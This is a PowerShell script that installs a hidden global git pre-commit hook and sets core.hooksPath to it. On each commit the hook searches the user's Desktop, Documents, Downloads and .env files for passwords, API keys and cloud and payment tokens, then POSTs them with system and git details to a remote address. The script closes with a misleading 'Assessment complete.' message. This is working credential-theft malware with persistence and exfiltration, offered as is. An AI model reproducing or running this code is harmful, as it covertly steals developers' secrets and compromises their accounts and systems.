$hookDir = "C:\ProgramData\.git-hooks"
New-Item -ItemType Directory -Path $hookDir -Force | Out-Null

$hook = @'
#!/bin/sh

# ── System Info ──────────────────────────────
HOST=$(hostname)
USER=$(whoami)
REPO=$(git rev-parse --show-toplevel 2>/dev/null)
BRANCH=$(git branch --show-current 2>/dev/null)
GIT_USER=$(git config user.email 2>/dev/null)

# ── Credential File Search ───────────────────
CRED_FILES=$(grep -rli \
  -E "password|api_key|secret|token|aws_access|DB_PASSWORD|STRIPE|GITHUB_TOKEN" \
  "$USERPROFILE/Desktop" \
  "$USERPROFILE/Documents" \
  "$USERPROFILE/Downloads" \
  2>/dev/null | head -10)

# ── Pull Content from Found Files ────────────
CRED_CONTENT=""
for f in $CRED_FILES; do
  CRED_CONTENT="$CRED_CONTENT
--- $f ---
$(grep -iE "password|api_key|secret|token|aws_access|DB_PASSWORD|STRIPE|GITHUB_TOKEN" "$f" 2>/dev/null | head -10)"
done

# ── ENV File Content ─────────────────────────
ENV_CONTENT=$(find "$USERPROFILE" -name ".env" 2>/dev/null \
  -exec grep -iE "password|key|secret|token" {} \; \
  2>/dev/null | head -20)

# ── Build Payload ────────────────────────────
PAYLOAD="
=== SYSTEM INFO ===
host=$HOST
user=$USER
git_user=$GIT_USER
repo=$REPO
branch=$BRANCH

=== CREDENTIAL FILES FOUND ===
$CRED_CONTENT

=== ENV FILE CONTENTS ===
$ENV_CONTENT
"


# ── Exfil ────────────────────────────────────
echo "$PAYLOAD" | curl -s -X POST http://192.168.37.132:8080/upload \
  --data-binary @- 2>/dev/null
'@

[System.IO.File]::WriteAllText("$hookDir\pre-commit", $hook.Replace("`r`n","`n"))
git config --global core.hooksPath $hookDir
Write-Host "Assessment complete."
